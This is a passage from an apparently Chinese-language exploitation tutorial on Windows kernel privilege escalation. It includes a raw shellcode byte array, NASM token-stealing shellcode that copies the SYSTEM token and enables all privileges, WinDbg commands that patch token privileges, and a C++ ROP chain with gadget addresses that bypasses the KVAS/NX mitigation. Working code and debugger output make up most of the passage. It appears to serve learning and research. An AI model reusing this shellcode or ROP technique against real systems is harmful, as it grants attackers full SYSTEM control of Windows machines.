<span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p>
<h2 id="c-分析上一篇的shellcode"><a class="markdownIt-Anchor" href="#c-分析上一篇的shellcode"></a> C. 分析上一篇的shellcode</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">	<span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>写入一个二进制文档，用ida逆向</p>
<p><img src="https://img.joe1sn.top/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p>
<p>发现原理一致，最后对栈的恢复不同</p>
<p>已知<code>gs:[0x188]</code>指向一个<code>_KTHREAD</code>结构体</p>
<p><img src="https://img.joe1sn.top/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p>
<p>根据windbg的调试结果知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4]		;+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx					;</span><br><span class="line">mov [rax+0x1e4], cx		;更新KernelApcDisable为0</span><br><span class="line">mov rdx, [rax+0x90]		;+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">						;_KTRAP_FRAME</span><br><span class="line">						;---下面为_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168]	;[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178]	;[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180]	;[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158]	;[+0x158] Rbp</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p>
<p>可能还是有点😵，反汇编一下<code>TrapFrame</code>的RIP</p>
<p><img src="https://img.joe1sn.top/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p>
<p>相当于通过<code>TrapFrame</code>，替换了exp中的<code>DeviceIoControl</code>（模仿正常执行），并让他正常返回</p>
<p>接着重定位GS寄存器，使用sysret返回，为了对齐，有的汇编是这样的写的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret	; nasm shit</span><br></pre></td></tr></table></figure>
<h2 id="d-开启token所有权限-优化shellcode"><a class="markdownIt-Anchor" href="#d-开启token所有权限-优化shellcode"></a> D. 开启Token所有权限 [优化shellcode]</h2>
<p>即使我们已经成功生成了令牌，但是功能依旧是不全的</p>
<p><img src="https://img.joe1sn.top/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p>
<p>被禁用的功能依旧有很多</p>
<h3 id="i-开启当前权限为启用"><a class="markdownIt-Anchor" href="#i-开启当前权限为启用"></a> I. 开启当前权限为启用</h3>
<p>重新打开一个普通用户的<code>cmd.exe</code></p>
<p><img src="https://img.joe1sn.top/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p>
<p>用A部分的方法找到该进程</p>
<p><img src="https://img.joe1sn.top/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p>
<p>查看token格式，对照一下SID。（注意低位要为0）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Token数值，但是个位数为0&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p>
<p>将Enabled值设置为Present值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p>
<p>查看权限</p>
<p><img src="https://img.joe1sn.top/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p>
<h3 id="ii-获得所有权限并启用"><a class="markdownIt-Anchor" href="#ii-获得所有权限并启用"></a> II. 获得所有权限并启用</h3>
<p>用A部分的方法得到System的Token</p>
<p><img src="https://img.joe1sn.top/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p>
<p>再得到SystemToken的Present值</p>
<p><img src="https://img.joe1sn.top/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p>
<p>设置当前Token的Present和Enabled为该值</p>
<p><img src="https://img.joe1sn.top/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p>
<p>查看权限</p>
<p><img src="https://img.joe1sn.top/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p>
<h3 id="iii重新编写shellcode"><a class="markdownIt-Anchor" href="#iii重新编写shellcode"></a> III.重新编写shellcode</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p>
<h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1>
<h2 id="a-简介"><a class="markdownIt-Anchor" href="#a-简介"></a> A. 简介</h2>
<p>KVAS全称是Kernel Virtual Address Shadow，它的出现与MeltDown（CVE-2017-5754）和TotalMeltDown（CVE-2018-1038）有关。</p>
<p>我的描述不一定准确，大致上来说这两个漏洞利用了CPU的乱序执行技术，即CPU在执行时不一定会按照流程执行。当我们访问一个不能被用户模式访问的内存页时，CPU会执行该语句然后将其缓存到内存中，等到发现不能访问后返回错误，但是该数据依旧存在于缓存当中。利用这种思路就可以完全读取内核中的数据，实现权限提升等。</p>
<p>微软为了缓解该漏洞，从用户页表中隔离出内核页表，让用户态访问到的内核页表也是经过映射的，并且会将用户页表自动标记为NX，让我们的shellcode无法执行</p>
<h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. Bypass</h2>
<p>虽然用户页表为不可执行，<strong>但是内核页表仍然可执行</strong>，只不过会延长我们ROP链的长度</p>
<p>需要用到的函数是：<code>ExAllocatePoolWithTag</code>和<code>RtlCopyMemory</code></p>
<ul>
<li><code>ExAllocatePoolWithTag</code>：用于在内核中开辟一块地址</li>
<li><code>RtlCopyMemory</code>：复制内存到内核开辟的内存池</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//空间大小：0x100</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>MSDN中说明该两个函数在内核中均位于<code> NtosKrnl.exe</code>里，我们可以利用第一章的内容寻找到该地址，可以使用CFF Explorer查看导出表找到函数</p>
<p><img src="https://img.joe1sn.top/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p>
<p>需要说明的一点是<code>ExAllocatePoolWithTag</code>有一个很恶心的地方就是</p>
<p><img src="https://img.joe1sn.top/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p>
<p>这三个mov会打乱我们精心设计的ROP链，而且后面根本没有使用到他，所以要直接进入<code>push rdi</code>的位置</p>
<p><code>RtlCopyMemory</code>其实是一个宏</p>
<p><img src="https://img.joe1sn.top/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure>
<p>根据微软的函数调用规则，传参顺序是<code>rcx</code>，<code>rdx</code>，<code>r8</code>，返回地参数在<code>rax</code>中</p>
<p>那么一个理想的ROP布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0	;暂时</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret	;此时rcx = ExAllocatePoolWithTag返回地内存地址</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure>
<p>就这些gadget中的pop会消除<code>rsp+0x28</code>的驱动的<code>Handle</code>函数返回地址，所以首先是抬栈，如<code>sub rsp, 0x100</code>，在<code>jmp rax</code>之前多次调用<code>ret</code>来抬升<code>rsp</code>的值，最终回到<code>shellcode</code>调整为适用的<code>rsp</code>值。</p>
<p><strong>实际情况中也不会有恰好的gadget用</strong></p>
<p>实际上能用的<code>mov rcx, rax</code>可以通过以下方式实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>这样就能让rcx=rax了，布局后栈的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure>
<ol>
<li><code>pop rdi</code>：<code>RDI</code> =<code>pop rcx地址</code>，出栈一个，<code>rsp</code>指向<code>push_rax_rdi</code>，然后<code>ret</code>跳转到该地址</li>
<li><code>push rax</code>：将申请的内核内存地址放到了栈上，<code>rsp</code>指向值就为该内存的地址</li>
<li><code>push rdi; ret</code>：等效于<code>jmp rdi</code>，于是<code>ret</code>到了<code>pop rcx</code></li>
<li><code>pop rcx</code>：此时的栈顶为 2 中入栈的<code>rax</code></li>
</ol>
<p><img src="https://img.joe1sn.top/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p>
<p>成功让<code>RCX=RAX</code></p>
<p><img src="https://img.joe1sn.top/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p>
<p>这里暂时设计payload</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;	<span class="comment">//rsp = 0</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;	<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line">																</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;		<span class="comment">//此处被低位被清零</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure>
<p>但是进行<code>ExAllocatePoolWithTag</code></p>
<p><img src="https://img.joe1sn.top/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p>
<p>打断了ROP链，让<code>rsp+68</code>的位置的低32位清零了，这让我们需要调整这段rop链</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;		<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;		<span class="comment">//恢复rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p>
